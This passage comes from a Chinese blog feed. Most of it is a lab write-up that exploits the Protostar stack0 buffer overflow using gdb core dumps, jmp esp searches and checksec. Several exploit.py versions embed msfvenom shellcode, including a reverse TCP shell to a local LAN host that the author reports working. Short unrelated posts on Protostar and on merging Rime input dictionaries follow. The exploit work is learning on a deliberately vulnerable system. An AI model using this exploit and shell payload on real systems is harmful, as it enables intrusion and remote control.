 0x080484a6 -&amp;gt; pop esi; pop edi; pop ebp; ret ; 
---------------------end---------------------

里面没有找到jmp esp,不理解为什么不搜索系统加载到内存的动态链接库so文件里的jmp esp，暂且不管这个问题
没有找到jmp esp,rop gadget这个功能主要是搜索用来获得ret2libc构造链中的子语句的功能，特点是每个gadget都是以ret结尾的一条或几条汇编小指令
换工具edb-debugger,kali自带，将stack0拖入edb,快捷键ctrl+o,或者从plugins选项中选择opcodesearcher工具(里面也有roptool,功能类似上面的rop-tool工具的功能,edb-debugger中的toptool功能可以看到系统内存已经加载的动态链接库列表，而上面freebuf中提到的rop-tool不能)
搜到jmp esp地址如下（由于本机kali为64位，所以显示成下图中样式，取其中32位的地址即可）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/opcodesearcher.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;取其中的0xf773813b,替换exploit.py中jmp_esp=&quot;\x3b\x81\x73\xf7&quot;,上图中选择的/lib/i386-linux-gnu/ld-2.19.so应该是随着操作系统启动加载到系统内存中的可用动态链接库文件

运行exploit.py,结果依然不行，这个jmp_esp还是没有被执行，可能是没有找到这个地址，不理解，暂且不管这个问题
python exploit.py
----------------outpout:------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�A&amp;gt;4P���do&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 07:53]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 7435]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xf773813b in ?? ()
(gdb) disas 0xf773813b
No function contains specified address.
-----------------end----------------------

无法有效利用jmp esp的方法,直接在main_ret位置上填充紧跟其后的shellcode的开始的地址，也即address(main_ret位置在内存中的地址0xffffd4fc)+0x4的结果:

shellcode_addr=0xffffd500

由于有00，在调用gets时系统复制从终端输入的超长字符串会提前停止，所以不能取0xffffd500,取成0xffffd501,在原来shellcode前面加一个nop(\x90),重新构造输入链：
&quot;a&quot;*80+&quot;\x01\xd5\ff\xff&quot;+&quot;\x90&quot;+shellcode
将exploit.py中jmp_esp替换为jmp_esp=&quot;\x01\xd5\xff\xff&quot;,并在shellcode前面加一个&quot;\x90&quot;,新的exploit.py如下:
------------------------exploit.py-------------------------------
#/usr/bin/python
import os
import sys
buf =  &quot;\x90&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x01\xd5\xff\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------------end----------------------------------

结果依然失败
-----------------output:---------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���1o&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ����A&amp;gt;4P���d
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 08:33]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 32688]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd501 in ?? ()
------------------end------------------------

重新运行./stack0,手工输入:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
其中1234对应为main_ret位置，bbbb为原来的shellcode位置
产生core文件后
gdb -q -c core
--------output:---------
[New LWP 25058]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x34333231 in ?? ()
---------end------------

x/4 $esp
------output:---------
0xff85ffc0:     0x62626262      0xff860000      0xff86005c      0xf77e679a
-------end------------

x/4 $esp-4
------output:---------
0xff85ffbc:     0x34333231      0x62626262      0xff860000      0xff86005c
--------end-----------

易知从这里（core)看到的shellcode开始的位置应该从0xff85ffc0开始（上面exploit.py中不在shellcode前加nop时使用的地址是0xffffd500）
而0xff85ffc0中没有\x00不影响直接执行shellcode,不加nop,构造成如下输入链：
&quot;a&quot;*80+&quot;\xc0\xff\x85\xff&quot;+shellcode
在exploit.py中具体如下：
-----------------exploit.py-------------------
#/usr/bin/python
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\xc0\xff\x85\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-------------------end0-----------------------

python exploit.py
-----------output:--------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�����1o�A&amp;gt;4P���d��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------end-----------------

gdb -q -c core
-------------output:---------------
[New LWP 2220]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xff85ffc0 in ?? ()
---------------end-----------------

依然在新的0xff85ffc0无法执行
x/40x $esp-4
----------output:------------
0xffe11e0c:     0xff85ffc0      0x3c6f31ba      0xd9cad905      0x5df42474
----------end----------------

可以看到此时应该将0xff85ffc0改成0xffe11e0c+0x4=0xffe11e10才会执行后面的shellcode(内容从0x3c6f31ba开始)
说明shellcode每次在内存中的位置都是变化的
后来又发现下面三种方法特点不同：
方法1：
    gdb ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    每次shellcode的位置（bbbb处)在内存中的地址都是0xffffd500
方法2:
    ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    gdb -q -c core
    从core文件中发现每次shellcode的位置（bbbb处）在内存中的地址都是变化的
方法3:
    vi exploit.py
    ------------exploit.py--------------
    #/usr/bin/python
    import os
    import sys
    buf =  &quot;&quot;
    buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
    buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
    buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
    buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
    buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
    buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
    buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
    buf += &quot;\x8b\xf4\xbe\x2c&quot;
    
    jmp_esp=&quot;some addr&quot;
    #print jmp_esp
    input=&quot;a&quot;*80+jmp_esp+buf
    print input
    os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
    ---------------end------------------

    gdb -q -c core
    从core文件中分析出的shellcode的位置（\xba\x31\x6f\x3c开始)都是变化的

通过这三种不同情况得出结论:
    1.linux的真实情况是每次shellcode在内存中的地址是变化的
    2.不能gdb ./stack0来看shellcode的内存地址，要通过gdb -q -c core来分析出系统运行./stack0时的真实情况,方法2和3都可行
    3.gdb ./stack0时，可能是系统判断有人在调度，所以故意让shellcode的内存地址每次都不变，用来干扰判断
    4.想直接在&quot;a&quot;*80+&quot;1234&quot;+&quot;bbbb&quot;中的1234的位置上写入shellcode的起始地址是行不能的，只能用jmp esp或其他方法

突然想到，在edb-debugger工具中找到的jmp esp的地址放入exploit.py中的jmp_esp中最后没有成功有可能是因为kali的安全防护功能，其中的系统内存中加载的/lib/i386-linux-gnu/ld-2.19.so有安全设置
下载checksec.sh检查一下：http://www.trapkit.de/tools/checksec.sh
chmod +x ./checksec.sh
./checksec.sh --file /lib/i386-linux-gnu/ld-2.19.so
-------------output:----------------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    DSO             No RPATH   No RUNPATH   /lib/i386-linux-gnu/ld-2.19.so
---------------end------------------

其中的NX enabled可以看出的确是这个原因
检查下./stack0：
发现也是NX enabled,这个stack0应该是我在kali上用gcc -g -o stack0 stack0.c编译出来的,默认有安全防护
复制原系统protostar中的/opt/protostar/bin/stack0到kali中
scp user:192.168.2.144:/opt/protostar/bin/stack0 /root/桌面
./checksec.sh --file stack0
-----------output:-----------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   stack0
-------------end-------------

这个才是原题protostar系统中的stack0,但是原系统中(protostar)溢出时无法产生core文件,无法分析执行时的shellcode和main_ret地址
无法产生core文件应该是由于protostar默认的user用户的权限对suid=root的/opt/protostar/bin/stack0文件权限不足以在发生溢出时产生core文件

解决方法：
cp /opt/protostar/bin/stack0 /tmp
这样/tmp/stack0就是user用户的文件了，溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性
开始一直是通过ssh user@192.168.2.144到protostar系统进行远程操作的，后来发现ssh登录时和直接在protostar系统中操作时不同，这两种情况下运行:
python exploit.py
在内存中分配的地址不同

ssh user@192.168.2.144时shellcode的内存地址为0xbffff790
直接在protostar虚拟机中操作时shellcode的内存地址为0xbffff880

后来以改为直接在protostar系统中操作,将jmp_esp的值改为&quot;\x80\xf8\xff\xbf&quot;
重新由下面语句生成shellcode,由原来的x64改成x86,LPORT改成2222(kali为64位系统,protostar为32位系统)

msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
exploit.py代码如下：
-------------------exploit.py-----------------------
#/usr/bin/python
import os
import sys

buf =  &quot;&quot;
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------end--------------------------------

发现还是无法反弹shell,于是在shellcode前加一串nop试试，发现加9个以上的nop（\x90)可以成功反弹shell
加上nop后代码如下:
----------------------exploit.py--------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
------------------------end-------------------------------

而经检验并不是shellcode在内存中的位置(0x0xbffff880)定位不准的问题,应该是由于以下原因造成：

上面msfvenom生成shellcode时，由于加了-b &quot;\x00&quot;参数，msfvenom默认用x86/shikata_ga_nai编码器编码，解码过程需要shellcode前面有一些空间（这里是9个字节大小的空间）用来帮助完成shellcode的解码过程
shellcode前面加上9个以上的nop后shellcode顺利的完成了解码，反弹了shell（本地事先用相同的payload+multi/handler监听,如果用nc -lvp 2222来监听不能建立shell的连接,用nc -lvp只能看到connect，然后就断了）
但是由于protostar系统是个liveCD系统，反弹的shell连上以后马上会断,应该是由于&quot;光盘&quot;特殊的原因
这样看来，并不是msf产生的shellcode就是毋庸置疑完全可靠的，前面竟要9个以上的空间才可支持其解码后顺利运行

用同样的方法在kali上尝试溢出反弹shell,将protostar系统中的stack0复制到kali上
scp user@192.168.3.105:/opt/protostar/bin/stack0 /root/桌面
用msfvenom重新生成shellcode:

msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
-------------------------output:-------------------------
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
buf =  &quot;&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;
--------------------------end----------------------------

此时exploit.py如下：

---------------------exploit.py------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;bbbb&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\xff\x48\x87\xa0&quot;    #此处jmp_esp暂时不确定
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------------end-----------------------------

尝试通过shellcode前面加上标志&quot;bbbb&quot;找出shellcode在内存中的固定地址，其中上面jmp_esp的值为随意填写的一个

python exploit.py
--------------output:-----------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�H��bbbbH1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                              V�ͮ���Mŷ�ĭ�
                                        ��?�M   o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
----------------end-------------------

gdb -q -c core
---------------output:------------------
[New LWP 24384]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xa08748ff in ?? ()
-----------------end--------------------

x/10x $esp
----------output:-----------
0xffd26180:     0x62626262      0x48c93148      0xfff6e981      0x8d48ffff
0xffd26190:     0xffffef05      0x53bb48ff      0xa29ca7dd      0x4805be89
0xffd261a0:     0x2d485831      0xfffffff8
-----------end--------------
由此看出shellcode在内存的地址应该写成0xffd26180,也即jmp_esp=&quot;\x80\x61\xd2\xff&quot;,并将&quot;bbbb&quot;换成&quot;\x90&quot;*9,修改exploit.py如下：
--------------------exploit.py-------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\x80\x61\xd2\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------end------------------------

重新运行：
python exploit.py
----------------output:-------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�a���������H1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                                 V�ͮ���Mŷ�ĭ�
                                           ��?�M        o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------------end---------------------

本机用相同的payload+multi/handler执行exploit无法获得shell
分析core
gdb -q -c core
-----------------output:--------------------
[New LWP 24746]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffd26180 in ?? ()
-------------------end----------------------

x/10x $esp
----------output:-------------
0xffa14160:     0x90909090      0x90909090      0xc9314890      0xf6e98148
0xffa14170:     0x48ffffff      0xffef058d      0xbb48ffff      0x9ca7dd53
0xffa14180:     0x05be89a2      0x48583148
-------------end--------------

从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化，这应该是由于kali的内核版本高，安全性好造成的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 04 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</guid>
        
        <category>stack</category>
        
        <category>linux</category>
        
        <category>disassemble</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>protostar系统学习</title>
        <description>&lt;h4 id=&quot;xff-about-protostar&quot;&gt;0xff About Protostar&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Protostar introduces the following in a friendly way:

Network programming
Byte order
Handling sockets
Stack overflows
Format strings
Heap overflows
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/p&gt;

&lt;p&gt;In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;official website:       https://exploit-exercises.com/protostar
nebula.iso download:    http://pan.baidu.com/s/1nvq3f5J
some witeup:    
    https://lightless.me/archives/protostar-stack-writeup.html
    http://bug.cool/2016/Protostar_Writeup/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x00-stack0&quot;&gt;0x00 stack0&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /opt/protostar/bin
    objdump -d -M intel stack0 &amp;gt; /tmp/stack0.out
    vi stack0.out
link knowledge:
    http://blog.163.com/lixiangqiu_9202/blog/static/535750372012727102618226/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 03 Jun 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/06/03/protostar/</link>
        <guid isPermaLink="true">/linux/2016/06/03/protostar/</guid>
        
        <category>overflow</category>
        
        <category>linux</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>rime五笔词库合并</title>
        <description>&lt;h4 id=&quot;x01-step1on-kali-linux&quot;&gt;0x01 Step1:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/rime_dic_manager -l
output:wubi86
cd /root/桌面/
/usr/bin/rime_dic_manager -e wubi86 kali.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-step2on-win7&quot;&gt;0x02 Step2:on win7&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd %appdata%\rime
copy wubi86.userdb.kct \\kali\桌面\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-step3on-kali-linux&quot;&gt;0x03 Step3:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/.config/fcitx/rime
mv /root/.config/fcitx/rime/wubi86.userdb.kct wubi86.userdb.kct.bak
cp /root/桌面/wubi86.userdb.kct .
重新布置rime
/usr/bin/rime_dic_manager -l
cd /root/桌面
/usr/bin/rime_dic_manager -e wubi86 win7.txt

-------------------two ways since now---------------
first:
/usr/bin/rime_dic_manager -i wubi86 kali.txt
重新布置rime

second:
vi -d kali.txt win7.txt
vi kali.txt
    G
    o
    esc
    :r win7.txt
    :x
python 字典去重.py kali.txt         (output:outfile.txt)
    this .py script:https://raw.githubusercontent.com/xinghuacai/password_tools/master/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7.py

/usr/bin/rime_dict_manager -r outfile.txt
or
/usr/bin/rime_dict_manager -i wubi86 outfile.txt

重新布置rime
---------------------end----------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;update&quot;&gt;update&lt;/h3&gt;

&lt;h4 id=&quot;section&quot;&gt;16-05-25&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;win7:
程序-&amp;gt;用户词库管理-&amp;gt;导出词典快照（rime-&amp;gt;rime）
                  -&amp;gt;导出文本码表(dic-&amp;gt;newdic)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;the difference between 词典快照 and 文本码表&lt;/p&gt;

&lt;p&gt;1.词典快照
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/%E8%AF%8D%E5%85%B8%E5%BF%AB%E7%85%A7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.文本码表
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/%E6%96%87%E6%9C%AC%E7%A0%81%E8%A1%A8.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-1&quot;&gt;16-05-28&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python script:(performs well on kali,but not on win7)

download:
https://raw.githubusercontent.com/xinghuacai/little_scripts/master/rimedic_handle.py

---------rimedic_handle.py------------
import sys
fp=open(sys.argv[1])
all=fp.readlines()
fp.close()
#print len(all)
newall2in3=[]
fp=open(&quot;newdic.txt&quot;,&quot;a+&quot;)
for eachline in all:
    if &quot;#&quot; not in eachline:
        eachline2in3=eachline.split(&#39;\t&#39;)[:2]
        if eachline2in3 not in newall2in3 and &#39;enc&#39; not in eachline and &#39; &#39; not in eachline2in3[0] and (eachline2in3[0][0]&amp;lt;&#39;a&#39; or eachline2in3[0][0]&amp;gt;&#39;z&#39;):
            newall2in3.append(eachline2in3)
            fp.write(eachline)

#print len(newall)
fp.close()
--------------------------------------
get pure txt dic
    different from real rime dic,this pure txt dic does not exist the rime dic header like
        # rime-...
        # user-id...
    but this pure txt dic has the same \t split symbol as real rime dic

dic from win7:
    导出文本码表
    cp out.txt \\kali\root\out.txt
    cd \\kali\root
    python rimedic_handle.py out.txt
    output:newdic.txt

dic from kali:
    cd /root/.config/fcxti/rime
    pkill fcitx
